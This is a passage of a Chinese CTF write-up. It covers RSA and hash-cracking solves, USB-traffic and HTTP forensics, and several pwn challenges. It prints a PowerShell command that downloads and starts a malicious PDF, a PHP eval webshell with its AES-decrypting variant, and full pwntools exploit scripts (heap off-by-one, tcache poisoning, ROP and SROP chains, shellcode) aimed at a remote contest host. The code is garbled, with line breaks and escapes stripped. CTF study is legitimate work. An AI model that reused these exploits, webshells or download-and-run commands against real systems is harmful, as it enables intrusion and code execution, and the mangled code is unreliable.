424184707992085368727036634979681060339188016631126395371395132791009626692092220877797321952063158959159298372653275672949543326347146732580465753892335912633332743258010037527036987474957662424735475674152462914082526658466925646224968182493094690460023505421720259663381122409147914948696061450626153526908753546708693503710352787787701648821693599138777500334149879355898444355846028142814267511986218166066642222930494985736426837825122392760739011897554697p=getpq(n,e,d)print(p)print(p.bit_length())
# 11568115523770241283014205836742530054306019163814454744901838687283694886517929951237863476145584478470559474432242227944198744343287840651037780447792423
# 512

可能第二次造成1024位，多分解几次就好了

分解这个得到p

拿到p之后对pub整除一下

当rsa直接解，拿到c1

c2= 7090659117351297531755883438960933877263181849815568437232708639999747137583085680350909771730266998763362206865224473283130982570816918537377058225538656521223617210560656370841094169187300346437355127376920626133248983100115455529533265136725274741407727211587363755394889303944789720637515498330115070515942678821608630620272575086220037432383957991049220528177053370450234486390431027269543481157974773863005279984438957464388749795275109730696430700744950555993640720758137888948464005039907816169108829675809911658280616090368129767282407708640291466242813209343944276906740181222776418701978734705056220412984from Crypto.Util.number import *d= 424184707992085368727036634979681060339188016631126395371395132791009626692092220877797321952063158959159298372653275672949543326347146732580465753892335912633332743258010037527036987474957662424735475674152462914082526658466925646224968182493094690460023505421720259663381122409147914948696061450626153526908753546708693503710352787787701648821693599138777500334149879355898444355846028142814267511986218166066642222930494985736426837825122392760739011897554697p=11568115523770241283014205836742530054306019163814454744901838687283694886517929951237863476145584478470559474432242227944198744343287840651037780447792423pub= 15393634704241437811571407047965218207529278849238950329420499882359515149154462592674433680412129087082275102567406550543503710118161775213536183656910892279726520148202227312448507629264239427121015706092403872586978266402316447553116208411724407465368711586887621447872002364407809592953543797319646692321612541334341183378900324146713189121105760280994702695266049904020810024990537652609099294535255399210219454610583930829883737909993183476961897889084229322415995483397484414924734020539093114397393070394929656598174957126771887906087335882580049097369036955153036983424389092042285637185882327630117320615769n=pub//pm=pow(c2,d,n)m=long_to_bytes(m)from Crypto.Util.Padding import *unpadded_msg = unpad(m,190)print(bytes_to_long(unpadded_msg))
# 6691017454537973459916766225986127089265667834308461228246818094176737181286904907109719141581143793245175303466918139030005490098361730749738872021616055112021648681447925744991355487138607374460097043104612880977136184245719389209859293127922873464772879478077826669339105617364491479707870369683694600497

from Crypto.Util.number import *import gmpy2n= 87665217778729524993118310155129480311708534438704150676980835344891979982717119161254489670350577173938239682286759779547789055360697960379769693294306641200724257991678505629369338313581657539655057636732714452287023658150014746541718058750871927050204352584824130972892779877896415568548748364583880371427a0= 9362970563807702423162361787386216886594085863490420184497563324865248429693287404341206766515622648778272030443641712923250846610046357375553046092690266a1= 9362970563807702423162361745963275441706212437133735476965289880825874017106479792816846422940594285630367772490647779230476318907092613021181772527068514b0= 74836747076024432741470938222753940689278814091833170112470104078475118700897724833941621360216319460657128947837095907483b1= 93520964011413593176393772179429258741894666938448164504029535235899813670669478849381259720656022408302270582527720184427c=6691017454537973459916766225986127089265667834308461228246818094176737181286904907109719141581143793245175303466918139030005490098361730749738872021616055112021648681447925744991355487138607374460097043104612880977136184245719389209859293127922873464772879478077826669339105617364491479707870369683694600497
e=(n-pow(a0,2))//pow(b0,2)p=gmpy2.gcd(n,b1*a0-b0*a1)q=n//pd=gmpy2.invert(e,(p-1)*(q-1))m=pow(c,d,n)from Crypto.Util.number import *print(long_to_bytes(m))
# b'flag{1a100d2c0dab19c4430e7d73762b3423}'

Crackme

bird

dirty_flag

# flag{09***********************************755ca2}import string, hashlib
from itertools import product
table = string.hexdigits[:-6]

def hash(val: str) -> str:    return hashlib.sha256(val.encode('utf-8')).hexdigest()

def doubleHash(val: str) -> str:    return hash(hash(val))

dict_4 = {}
for i in product(table, repeat=4):    i = ''.join(i)    dict_4[doubleHash(i)] = i
dict_6_head = {}dict_6_tail = {}
for i in product(table, repeat=6):    tmp = ''.join(i)    h = 'flag{09' + tmp    dict_6_head[doubleHash(h)] = h        t = tmp + '755ca2}'    dict_6_tail[doubleHash(t)] = t    a = '55cfb0b1cf88f01fc9ed2956a02f90f9014d47ad303dbb52fe7d331ddea37d88't = '41a5f7781dc69308b187e24924e0a0a337cdcc36f06b736dd99810eda7bb867b 41a5f7781dc69308b187e24924e0a0a337cdcc36f06b736dd99810eda7bb867b a64cd974e0dbd6f6a289ebd2080ffb6e8ac47f794e02cde4db2239c42f63b6ba e813a50278e41a5ea532c95f99ab616d4ec1ffabad99e1c8fde23886bb600005 8d4bd8d58ddd11cea747d874e676582bb219b065b2989d96b566f0689a3aaff5 8d4bd8d58ddd11cea747d874e676582bb219b065b2989d96b566f0689a3aaff5 e477515e963dc46294e815f9b1887541d225f4b027a7129608302ba8d07faef2 e477515e963dc46294e815f9b1887541d225f4b027a7129608302ba8d07faef2't = t.split(' ')f = [t[2],t[3],t[4]]flag = ''flag += dict_6_head[t[0]] + '-'for i in f:    flag += dict_4[i] + '-'flag += dict_6_tail[t[-1]]print(flag)
# flag{09806994-5a04-45ef-bde0-c69658755ca2}

MISC

非常坏usb

normalKeys = {"04": "a", "05": "b", "06": "c", "07": "d", "08": "e", "09": "f", "0a": "g", "0b": "h", "0c": "i",              "0d": "j", "0e": "k", "0f": "l", "10": "m", "11": "n", "12": "o", "13": "p", "14": "q", "15": "r",              "16": "s", "17": "t", "18": "u", "19": "v", "1a": "w", "1b": "x", "1c": "y", "1d": "z", "1e": "1",              "1f": "2", "20": "3", "21": "4", "22": "5", "23": "6", "24": "7", "25": "8", "26": "9", "27": "0",              "28": "<RET>", "29": "<ESC>", "2a": "<DEL>", "2b": "t", "2c": "<SPACE>", "2d": "-", "2e": "=", "2f": "[",              "30": "]", "31": "\", "32": "<NON>", "33": ";", "34": "'", "35": "<GA>", "36": ",", "37": ".", "38": "/",              "39": "<CAP>", "3a": "<F1>", "3b": "<F2>", "3c": "<F3>", "3d": "<F4>", "3e": "<F5>", "3f": "<F6>",              "40": "<F7>", "41": "<F8>", "42": "<F9>", "43": "<F10>", "44": "<F11>", "45": "<F12>"}shiftKeys = {"04": "A", "05": "B", "06": "C", "07": "D", "08": "E", "09": "F", "0a": "G", "0b": "H", "0c": "I",             "0d": "J", "0e": "K", "0f": "L", "10": "M", "11": "N", "12": "O", "13": "P", "14": "Q", "15": "R",             "16": "S", "17": "T", "18": "U", "19": "V", "1a": "W", "1b": "X", "1c": "Y", "1d": "Z", "1e": "!",             "1f": "@", "20": "#", "21": "$", "22": "%", "23": "^", "24": "&", "25": "*", "26": "(", "27": ")",             "28": "<RET>", "29": "<ESC>", "2a": "<DEL>", "2b": "t", "2c": "<SPACE>", "2d": "_", "2e": "+", "2f": "{",             "30": "}", "31": "|", "32": "<NON>", "33": """, "34": ":", "35": "<GA>", "36": "<", "37": ">", "38": "?",             "39": "<CAP>", "3a": "<F1>", "3b": "<F2>", "3c": "<F3>", "3d": "<F4>", "3e": "<F5>", "3f": "<F6>",             "40": "<F7>", "41": "<F8>", "42": "<F9>", "43": "<F10>", "44": "<F11>", "45": "<F12>"}
out = ""path = "C:\Users\HK\Desktop\out"with open(path, "r") as f:    for line in f.readlines():        line = line.strip()        if len(line) != 0:            print(line)            try:                if line[:2] == "02":                    out += shiftKeys[line[6:8]]                elif line[:2] == "00":                    out += normalKeys[line[6:8]]            
except:                pass
print(out)>>> powershell(New-Object<SPACE>System.Net.WebClient).DownloadFile('https"//github.com/jiayuqi7813/download/releases/download/f/mal.pdf',<SPACE>'C"word.pdf')cmd<SPACE>/c<SPACE>start<SPACE>C"word.pdf

得到链接：

https://github.com/jiayuqi7813/download/releases/download/f/mal.pdf

下载得到的pdf中隐藏了一个png图片

需要修补文件

pdf里的恶意行为提取出来是这个

确定的隐写工具是cloacked-pixel-master

key 将恶意行为里的key拼接在一起 

f38aeb65a88f50a2373643a82158c6dc

进行colacked-pixel-master解密得到flag

good_http

> python .bwmforpy3.py decode .test2one.png .test2theother.png .test21.png --alpha 10.0

XD8C2VOKEU

complicated_http

在HTTP中，重点看uploads，发现一个php代码。猜测可以用来解密。先把HTTP流量包导出来

发现有shell.php

其中与解密脚本相对应，可以解密。

<?php eval(@$_POST['trustme']); ?>
<?php@error_reporting(0);function Decrypt($data)  {      $key="9d239b100645bd71";    $magicNum=hexdec(substr($key,0,2))%16;    $data=substr($data,0,strlen($data)-$magicNum);    return openssl_decrypt(base64_decode($data), "AES-128-ECB", $key,OPENSSL_PKCS1_PADDING);  }$post=Decrypt(file_get_contents("php://input"));eval($post);?>

ZmxhZ3sxZWM1YmU1YS1hZmJkLTQ4NjctODAwYi0zZWI3MzliOWUzYmR9Cg==

文末:

欢迎师傅们加入我们:

星盟安全团队纳新群2:
346014666

有兴趣的师傅欢迎一起来讨论!


```
int __cdecl main(int argc, const char **argv, const char **envp){  __int64 v4; // [rsp+0h] [rbp-90h] BYREF  __int64 v5; // [rsp+8h] [rbp-88h] BYREF  __int64 s[13]; // [rsp+10h] [rbp-80h] BYREF  char buf[8]; // [rsp+7Ch] [rbp-14h] BYREF  int v8; // [rsp+84h] [rbp-Ch]  void (**v9)(void); // [rsp+88h] [rbp-8h]
  setvbuf(stdout, 0LL, 2, 0LL);  setvbuf(stdin, 0LL, 2, 0LL);  v9 = (void (**)(void))malloc(0x10uLL);  *v9 = (void (*)(void))begin;  v9[1] = (void (*)(void))end;  (*v9)();  memset(s, 0, 0x50uLL);  puts("There's a box and you should input two keys to get the access to use the boxn");  puts("Input the first key: ");  __isoc99_scanf("%lld", &v5);  puts("Input the second key: ");  __isoc99_scanf("%lld", &v4);  if ( v5 > 2 )    exit(0);  s[v5] = v4;  if ( s[12] == 1 )  {    while ( 1 )    {      menu();      read(0, buf, 8uLL);      v8 = atoi(buf);      switch ( v8 )      {        case 1:          show();          break;        case 2:          add();          break;        case 3:          change();          break;        case 4:          delete();          break;        case 5:          v9[1]();          exit(0);        default:          puts("invaild choicen");          break;      }    }  }  puts("The keys are wrong.");  return 0;}
void __fastcall change(){  char nptr[8]; // [rsp+4h] [rbp-1Ch] BYREF  char buf[8]; // [rsp+Ch] [rbp-14h] BYREF  int v2; // [rsp+14h] [rbp-Ch]  int v3; // [rsp+18h] [rbp-8h]  int v4; // [rsp+1Ch] [rbp-4h]
  if ( num )  {    printf("Please enter the index of item:");    read(0, buf, 8uLL);    v4 = atoi(buf);    if ( itemlist[v4].buf )    {      printf("Please enter the length of item:");      read(0, nptr, 8uLL);      v3 = atoi(nptr);      printf("Please enter the new name of the item:");      v2 = read(0, itemlist[v4].buf, v3);      itemlist[v4].buf[v2] = 0;    }    else    {      puts("invaild index");    }  }  else  {    puts("No item in the box");  }}
#!/usr/bin/python3
# -*- coding:
utf-8 -*-
from pwn import *context.clear(arch='amd64', os='linux', log_level='debug')
def add(size, content):    sh.sendlineafter(b'Your choice:', b'2')    sh.sendlineafter(b'Please enter the length of the item:', str(size).encode())    sh.sendafter(b'Please enter the name of item:', content)
def edit(index, size, content):    sh.sendlineafter(b'Your choice:', b'3')    sh.sendlineafter(b'Please enter the index of item:', str(index).encode())    sh.sendlineafter(b'Please enter the length of item:', str(size).encode())    sh.sendafter(b'Please enter the new name of the item:', content)
sh = remote('116.236.144.37', 23451)sh.sendlineafter(b'Input the first key:', str(-9223372036854775796).encode())sh.sendlineafter(b'Input the second key:', str(1).encode())
add(0x18, b'n')edit(-0x398, 8, p64(0x401765)[:7])sh.sendlineafter(b'Your choice:', b'2')sh.sendlineafter(b'Please enter the length of the item:', str(8).encode())
sh.interactive()
void __fastcall edit_column(const char *table_name, const char *column_name){  table *v2; // [rsp+10h] [rbp-40h]  column *dest; // [rsp+18h] [rbp-38h]  __int64 buf[6]; // [rsp+20h] [rbp-30h] BYREF
  buf[5] = __readfsqword(0x28u);  v2 = seek_table(table_name);  memset(buf, 0, 0x20);  if ( v2 )  {    dest = seek_column(v2, column_name);    if ( dest )    {      puts("Column name:");      read(0, buf, 0x20uLL);      if ( strlen((const char *)buf) <= 0x10 )      {        strcpy(dest->name, (const char *)buf);  // off by one        puts("Column Content: ");        read(0, dest->buf, 0x100uLL);        puts("Done");      }      else      {        puts("Invalid colunm name");      }    }  }  else  {    puts("Table not exits");  }}
#!/usr/bin/python3
# -*- coding:
utf-8 -*-
from pwn import *context.clear(arch='amd64', os='linux', log_level='debug')
def create_table(table_name):    sh.sendlineafter(b'mysql > ', b'CREATE TABLE ' + table_name)
def create_column(table_name, column_name):    sh.sendlineafter(b'mysql > ', b'CREATE  ' + column_name + b' FROM ' + table_name)
def show_table(table_name):    sh.sendlineafter(b'mysql > ', b'SHOW TABLE ' + table_name)
def delete_column(table_name, column_name):    sh.sendlineafter(b'mysql > ', b'DELETE  ' + column_name + b' FROM ' + table_name)
def edit_column(table_name, column_name, new_column_name, content):    sh.sendlineafter(b'mysql > ', b'EDIT  ' + column_name + b' FROM ' + table_name)    sh.sendafter(b'Column name:', new_column_name)    sh.sendafter(b'Column Content: ', content)
sh = remote('116.236.144.37', 26713)
create_table(b'table0')
create_column(b'table0', b'column0')create_column(b'table0', b'column1')
delete_column(b'table0', b'column0')delete_column(b'table0', b'column1')
create_column(b'table0', b'column0')create_column(b'table0', b'column1')create_column(b'table0', b'column2')
show_table(b'table0')sh.recvuntil(b'Column Content: ')heap_addr = u64(sh.recvn(6) + b'00') - 0x330success('heap_addr: ' + hex(heap_addr))
edit_column(b'table0', b'column0', b'column0', flat({0x90:b'hijack0', 0xa0:0, 0xa8:
heap_addr + 0x300, 0xb0:
heap_addr}, filler=b'0'))edit_column(b'table0', b'column1', b'1' * 0x10, b'n') # off-by-one
create_column(b'table0', b'column3')create_column(b'table0', b'column4')edit_column(b'table0', b'hijack0', b'hijack0', flat({0x8:
0x291, 0x2e:7}, filler=b'0'))delete_column(b'table0', b'column3')edit_column(b'table0', b'column0', b'column0', flat({0x90:b'hijack0', 0xa0:0, 0xa8:
heap_addr + 0x300, 0xb0:
heap_addr+0x6f0}, filler=b'0'))show_table(b'table0')
sh.recvuntil(b'Column Name: hijack0')sh.recvuntil(b'Column Content: ')libc_addr = u64(sh.recvn(6) + b'00') - 0x1ecbe0success('libc_addr: ' + hex(libc_addr))
edit_column(b'table0', b'column0', b'column0', flat({0x90:b'hijack0', 0xa0:0, 0xa8:
heap_addr + 0x300, 0xb0:
libc_addr+0x1eee48-8}, filler=b'0'))edit_column(b'table0', b'hijack0', b'hijack0', b'/bin/sh0' + p64(libc_addr + 0x52290))delete_column(b'table0', b'hijack0')
sh.interactive()
void __fastcall edit(arg *a1){  int size; // eax  int find; // [rsp+18h] [rbp-18h]  int i; // [rsp+1Ch] [rbp-14h]  unsigned int v4; // [rsp+20h] [rbp-10h]  int v5; // [rsp+24h] [rbp-Ch]  const char *nptr; // [rsp+28h] [rbp-8h]
  if ( !auth )    exit(1);  find = 0;  for ( i = 0; i <= 15; ++i )  {    if ( a1->inner[i].name && !strcmp(a1->inner[i].name, "Idx") )    {      find = 1;      nptr = a1->inner[i].value;    }  }  if ( find == 1 )  {    v4 = atol(nptr);    if ( v4 <= 0x1F )    {      if ( ptr[v4].buf )      {        if ( strlen(a1->payload) >= (unsigned int)ptr[v4].size )          size = ptr[v4].size;        else          size = strlen(a1->payload);        v5 = size;        memcpy(ptr[v4].buf, a1->payload, size);        ptr[v4].buf[v5] = 0;                    // off-by-one      }    }  }}
#!/usr/bin/python3
# -*- coding:
utf-8 -*-
from pwn import *context.clear(arch='amd64', os='linux', log_level='info')
sh = remote('116.236.144.37', 20429)
def request(path, headers, payload):    prefix = b'''Host: localhostConnection: keep-aliveUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflateAccept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7'''.replace(b'n', b'rn')    req = b'POST ' + path + b' HTTP/1.1rn' + prefix    for k in headers:        req += k + b': ' + headers[k] + b'rn'    req += b'rn' + payload    sh.recvuntil(b'parser> ')    sh.send(req)

request(b'/login', {b'Username': b'1' * 0x20 + p8(1), b'Content-Length': str(4).encode()}, b' ')for i in range(10):    request(b'/create', {b'Content-Length': str(0xf8).encode()}, b'a' * 0xf8 + b'n')
for i in range(9):    request(b'/delete', {b'Content-Length': str(0).encode(), b'Idx':
str(i).encode()}, b'n')for i in range(9):    request(b'/create', {b'Content-Length': str(0xf8).encode()}, b'a' * 0xf8 + b'n')request(b'/show', {b'Idx': b'0', b'Content-Length': str(0).encode()}, b'n')heap_addr = u64(sh.recvn(8)) - 0x760success('heap_addr: ' + hex(heap_addr))
request(b'/show', {b'Idx': b'7', b'Content-Length': str(0).encode()}, b'n')libc_addr = u64(sh.recvn(8)) - 0x3ebe90success('libc_addr: ' + hex(libc_addr))
request(b'/edit', {b'Idx': b'6', b'Content-Length': str(0xf8).encode()}, b'0' + b'a' * 0xf8) # off-by-one
def edit(index, offset, content):    for i in range(7):        request(b'/edit', {b'Idx': str(index).encode(), b'Content-Length': str(offset + 7 - i).encode()}, b'0' + b'a' * (offset + 7 - i) + p8(0))    for i in range(8):        chr = content[i]        if chr != 0:            request(b'/edit', {b'Idx': str(index).encode(), b'Content-Length': str(offset + i + 1).encode()}, b'0' + b'a' * (offset) + content[:i + 1])
for i in range(7):    request(b'/edit', {b'Idx': str(6).encode(), b'Content-Length': str(0xf0 + 7 - i).encode()}, b'0' + b'a' * (0xf0 + 7 - i) + p8(0))request(b'/edit', {b'Idx': b'6', b'Content-Length': str(0xf0+2).encode()}, b'0' + b'a' * (0xf0) + b'x01x01' + p8(0))request(b'/edit', {b'Idx': b'6', b'Content-Length': str(0xf0).encode()}, b'0' + b'a' * (0xf0) + p8(0))
request(b'/edit', {b'Idx': str(6).encode(), b'Content-Length': str(0x8+7).encode()}, b'0' + b'a' * (0x8+7) + p8(0))request(b'/edit', {b'Idx': str(6).encode(), b'Content-Length': str(0x8+6).encode()}, b'0' + b'a' * 0x8 + p64(heap_addr + 0x250)[:6] + p8(0))
request(b'/edit', {b'Idx': str(6).encode(), b'Content-Length': str(0+7).encode()}, b'0' + b'a' * (0+7) + p8(0))request(b'/edit', {b'Idx': str(6).encode(), b'Content-Length': str(0+6).encode()}, b'0' + p64(heap_addr + 0x250)[:6] + p8(0))

for i in range(5):    request(b'/delete', {b'Idx': str(i).encode(), b'Content-Length': str(0).encode()}, b'0')request(b'/delete', {b'Idx': b'7', b'Content-Length': str(0).encode()}, b'0')request(b'/delete', {b'Idx': b'8', b'Content-Length': str(0).encode()}, b'0')
request(b'/delete', {b'Idx': b'5', b'Content-Length': str(0).encode()}, b'0')
request(b'/create', {b'Content-Length': str(0x18).encode()}, b'0' + b'a' * 0x18)request(b'/create', {b'Content-Length': str(0x18).encode()}, b'0' + b'a' * 0x18)request(b'/delete', {b'Idx': b'0', b'Content-Length': str(0).encode()}, b'0')request(b'/delete', {b'Idx': b'1', b'Content-Length': str(0).encode()}, b'0')
request(b'/edit', {b'Idx': str(6).encode(), b'Content-Length': str(0x20+6).encode()}, b'0' + b'a' * 0x20 + p64(libc_addr + 0x3ee098)[:6] + p8(0))
request(b'/create', {b'Content-Length': str(0x18).encode()}, b'0' + b'a' * 0x18)request(b'/create', {b'Content-Length': str(0x18).encode()}, b'0' + b'a' * 0x18)
request(b'/show', {b'Idx': b'1', b'Content-Length': str(0).encode()}, b'n')
stack_addr = u64(sh.recvn(8)) - 0success('stack_addr: ' + hex(stack_addr))
request(b'/create', {b'Content-Length': str(0x28).encode()}, b'0' + b'a' * 0x28)request(b'/create', {b'Content-Length': str(0x28).encode()}, b'0' + b'a' * 0x28)request(b'/delete', {b'Idx': b'2', b'Content-Length': str(0).encode()}, b'0')request(b'/delete', {b'Idx': b'3', b'Content-Length': str(0).encode()}, b'0')

request(b'/edit', {b'Idx': str(6).encode(), b'Content-Length': str(0x70+6).encode()}, b'0' + b'a' * 0x70 + p64(stack_addr - 0x750)[:6] + p8(0))
request(b'/create', {b'Content-Length': str(0x28).encode()}, b'0' + b'a' * 0x28)request(b'/create', {b'Content-Length': str(0x28).encode()}, b'0' + b'a' * 0x28)
# strace()
rop_chain = flat([    libc_addr + 0x000000000002164f, # pop rdi; ret;    stack_addr & (~0xfff),    libc_addr + 0x0000000000023a6a, # pop rsi; ret;    0x1000,    libc_addr + 0x0000000000001b96, # pop rdx; ret;    7,    libc_addr + 0x000000000001b500, # pop rax; ret;    10,    libc_addr + 0x00000000000d2625, # syscall; ret;    libc_addr + 0x0000000000002b25, # jmp rsp; ])
shellcode = asm('''    mov eax, 0x67616c66 ;// flag    push rax
    mov rsi, rsp    xor eax, eax    mov edx, eax    mov edi, -100    mov eax, 257    syscall ;// openat
    push rax    mov rsi, rsp    xor eax, eax    mov edx, eax    inc eax    mov edi, eax    mov dl, 8    syscall ;// write open() return value
    pop rax    test rax, rax    js over
    mov edi, eax    mov rsi, rsp    mov edx, 0x01010201    sub edx, 0x01010101    xor eax, eax    syscall ;// read
    mov edx, eax    mov rsi, rsp    xor eax, eax    inc eax    mov edi, eax    syscall ;// write
over:    xor edi, edi    mov eax, 0x010101e8    sub eax, 0x01010101    syscall ;// exit''')request(b'/edit', {b'Idx': str(3).encode(), b'Content-Length': str(0+6).encode()}, b'0' + b'a' * 0 + p64(libc_addr + 0x0000000000040558)[:6] + p8(0) + b' ' * 5 + b'abcdabcd' + b' ' * 0x70 + rop_chain + shellcode)
sh.interactive()
__int64 __fastcall echo(char **args){  dir *v2; // rbx  int v3; // [rsp+14h] [rbp-3Ch]  int i; // [rsp+14h] [rbp-3Ch]  int chunk_size; // [rsp+18h] [rbp-38h]  int v6; // [rsp+1Ch] [rbp-34h]  int size; // [rsp+24h] [rbp-2Ch]  dir *child; // [rsp+28h] [rbp-28h] BYREF  const char *v9; // [rsp+30h] [rbp-20h]  unsigned __int64 v10; // [rsp+38h] [rbp-18h]
  v10 = __readfsqword(0x28u);  v3 = 0;  if ( args[1] )  {    do      ++v3;    while ( args[v3] );    v6 = v3 - 1;    if ( check_redirect(args[v3 - 2]) )    {      for ( i = 1; i < v6; ++i )        printf("%s", args[i]);      puts(args[v6]);      return 1LL;    }    else    {      child = cmd_bak->child;      v9 = args[v6];      if ( (unsigned __int8)check_repeat(&child, v9) != 1 )      {        fprintf(stderr, "mybash: %s: No such filen", v9);        return 1LL;      }      else if ( is_dir(child) )      {        if ( child->buf )        {          chunk_size = get_chunk_size((__int64)child->buf);        }        else        {          chunk_size = 0x1F0;          v2 = child;          v2->buf = (char *)malloc(0x1F0uLL);          if ( !child->buf )            _exit(0);        }        size = strlen(args[v6 - 2]);        while ( size > chunk_size )          chunk_size += 0x1F0;        if ( chunk_size > (unsigned __int64)get_chunk_size((__int64)child->buf) )          child = (dir *)realloc(child->buf, chunk_size);// Structural confusion        strncpy(child->buf, args[v6 - 2], size);        return 1LL;      }      else      {        fprintf(stderr, "mybash: %s: Is a directoryn", v9);        return 1LL;      }    }  }  else  {    putchar('n');    return 1LL;  }}
#!/usr/bin/python3
# -*- coding:
utf-8 -*-
from pwn import *context.clear(arch='amd64', os='linux', log_level='debug')
def touch(name):    sh.sendlineafter(b'x1B[0m', b'touch ' + name)
def echo(name, content):    sh.sendlineafter(b'x1B[0m', b'echo ' + content + b' > ' + name)
def rm(name):    sh.sendlineafter(b'x1B[0m', b'rm ' + name)
def cat(name):    sh.sendlineafter(b'x1B[0m', b'cat ' + name)
sh = remote('116.236.144.37', 23669)touch(b'0')touch(b'1')touch(b'2')

echo(b'0', b'a')echo(b'1', b'a')rm(b'0')rm(b'1')touch(b'0')touch(b'1')
echo(b'0', b'0')cat(b'0')
heap_addr = u64(sh.recvn(6) + b'00') - 0x730success('heap_addr: ' + hex(heap_addr))
for i in range(10, 20):    touch(str(i).encode())
for i in range(10, 16):    echo(str(i).encode(), b'a')touch(b'100')

echo(b'0', b'a' * 0x18 + p64(heap_addr + 0x1308-0x200)[:6])echo(b'0', b'a' * 0x200 + p16(0x601))
rm(b'13')

echo(b'16', b'a')echo(b'17', b'a')
cat(b'14')
libc_addr = u64(sh.recvn(6) + b'00') - 0x1ecbe0success('libc_addr: ' + hex(libc_addr))
echo(b'18', b'a')echo(b'19', b'a')
rm(b'19')rm(b'18')echo(b'14', p64(libc_addr + 0x1eee48)[:6])
touch(b'18')touch(b'19')
echo(b'18', b'a')
class ucontext_t:    '''    [0x1c0] must be NULL.    '''    length = 0x1c8    bin_str = length * b'0'    rip = 0    rsp = 0    rbx = 0    rbp = 0    r12 = 0    r13 = 0    r14 = 0    r15 = 0    rsi = 0    rdi = 0    rcx = 0    r8 = 0    r9 = 0    rdx = 0
    def __init__(self):        pass
    def set_value(self, offset, value):        if(offset <= 0 or offset > self.length - 8):            raise Exception("Out bound!")        temp = self.bin_str        temp = temp[:
offset] + struct.pack('Q', value) + temp[offset + 8:]        self.bin_str = temp
    def __bytes__(self):        self.set_value(0xe0, self.rip)  # readable        self.set_value(0xa8, self.rip)  # rip        self.set_value(0xa0, self.rsp)        self.set_value(0x80, self.rbx)        self.set_value(0x78, self.rbp)        self.set_value(0x48, self.r12)        self.set_value(0x50, self.r13)        self.set_value(0x58, self.r14)        self.set_value(0x60, self.r15)        self.set_value(0x70, self.rsi)        self.set_value(0x68, self.rdi)        self.set_value(0x98, self.rcx)        self.set_value(0x28, self.r8)        self.set_value(0x30, self.r9)        self.set_value(0x88, self.rdx)
        return self.bin_str
srop = ucontext_t()srop.rip = libc_addr + 0x000000000013b3ea # add eax, 0x10; ret; srop.rsp = heap_addr + 0x2948
pre_payload = b'0' * 0x800 + flat([    b'cccccccc',    libc_addr + 0x0000000000023b6a, # pop rdi; ret;    heap_addr + 0x2000,    libc_addr + 0x000000000002601f, # pop rsi; ret;    0x1000,    libc_addr + 0x0000000000142c92, # pop rdx; ret;    7,    libc_addr + 0x0000000000036174, # pop rax; ret;    0xfffffffa,    libc_addr + 0x000000000013b3ea, # add eax, 0x10; ret;    libc_addr + 0x00000000000630a9, # syscall; ret;    heap_addr + 0x29a0    ]) + asm('''    mov eax, 0x67616c66 ;// flag    push rax
    mov rsi, rsp    xor eax, eax    mov edx, eax    mov edi, -100    mov eax, 257    syscall ;// openat
    push rax    mov rsi, rsp    xor eax, eax    mov edx, eax    inc eax    mov edi, eax    mov dl, 8    syscall ;// write open() return value
    pop rax    test rax, rax    js over
    mov edi, eax    mov rsi, rsp    mov edx, 0x01010201    sub edx, 0x01010101    xor eax, eax    syscall ;// read
    mov edx, eax    mov rsi, rsp    xor eax, eax    inc eax    mov edi, eax    syscall ;// write
over:    xor edi, edi    mov eax, 0x010101e8    sub eax, 0x01010101    syscall ;// exit''')
sh.sendlineafter(b'x1B[0m', pre_payload)
payload = bytes(srop)echo_payload = b'echo ' + p64(libc_addr + 0x54f24)[:6] + b' > ' + b'19'payload = echo_payload + payload[len(echo_payload):]sh.sendlineafter(b'x1B[0m', payload)
sh.interactive()
from pwn import *p=remote("116.236.144.37",24589)p.recvuntil("Now you can write one 4 byte value to memory. Where would you like to write?n")p.sendline("804C020")p.recvuntil("What value would you like to write to 0x")p.sendline("804932C")p.recvuntil("input anything to get the final flag, it should be used to lead to a special segment fault!n")p.sendline("a"*1000)p.interactive()
//flag{UUU123QWE}#include <stdio.h>int __cdecl switch_ca(int a1){    int v2; // [esp+4h] [ebp-4h]
    v2 = 0;    switch (a1)    {    case 0:        return 10;    case 1:        return 9;    case 2:        return 8;    }    return v2;}int main() {
    unsigned char aaa[] =    {      0x66, 0x6C, 0x61, 0x67, 0x7B, 0x77, 0x68, 0x65, 0x72, 0x65,      0x20, 0x69, 0x73, 0x20, 0x74, 0x6F, 0x6D, 0x7D, 0x00, 0x00,      0x66, 0x6C, 0x61, 0x67, 0x7B, 0x4D, 0x79, 0x20, 0x63, 0x68,      0x65, 0x65, 0x73, 0x65, 0x7D, 0x00, 0x66, 0x6C, 0x61, 0x67,      0x7B, 0x69, 0x20, 0x6D, 0x69, 0x73, 0x73, 0x20, 0x74, 0x6F,      0x6D, 0x7D, 0x00, 0x00, 0x00, 0x00, 0x66, 0x6C, 0x61, 0x67,      0x7B, 0x6C, 0x65, 0x74, 0x27, 0x73, 0x20, 0x68, 0x61, 0x76,      0x65, 0x20, 0x61, 0x20, 0x66, 0x75, 0x6E, 0x7D, 0x00, 0x00,      0x66, 0x6C, 0x61, 0x67, 0x7B, 0x75, 0x20, 0x77, 0x61, 0x6E,      0x74, 0x20, 0x73, 0x74, 0x65, 0x61, 0x6C, 0x20, 0x6D, 0x79,      0x20, 0x63, 0x68, 0x65, 0x65, 0x73, 0x65, 0x7D, 0x00, 0x00,      0x00, 0x00, 0x66, 0x6C, 0x61, 0x67, 0x7B, 0x69, 0x20, 0x68,      0x61, 0x76, 0x65, 0x64, 0x20, 0x6C, 0x6F, 0x73, 0x74, 0x20,      0x61, 0x20, 0x63, 0x68, 0x65, 0x65, 0x73, 0x65, 0x7D, 0x00,      0x66, 0x6C, 0x61, 0x67, 0x7B, 0x63, 0x68, 0x65, 0x65, 0x73,      0x65, 0x20, 0x69, 0x73, 0x20, 0x6D, 0x79, 0x20, 0x6C, 0x69,      0x66, 0x65, 0x7D, 0x00, 0x66, 0x6C, 0x61, 0x67, 0x7B, 0x77,      0x68, 0x61, 0x74, 0x20, 0x64, 0x69, 0x64, 0x20, 0x79, 0x6F,      0x75, 0x20, 0x68, 0x61, 0x76, 0x65, 0x20, 0x66, 0x6F, 0x72,      0x20, 0x62, 0x72, 0x65, 0x61, 0x6B, 0x66, 0x61, 0x73, 0x74,      0x7D, 0x00, 0x00, 0x00, 0x66, 0x6C, 0x61, 0x67, 0x7B, 0x6C,      0x65, 0x74, 0x27, 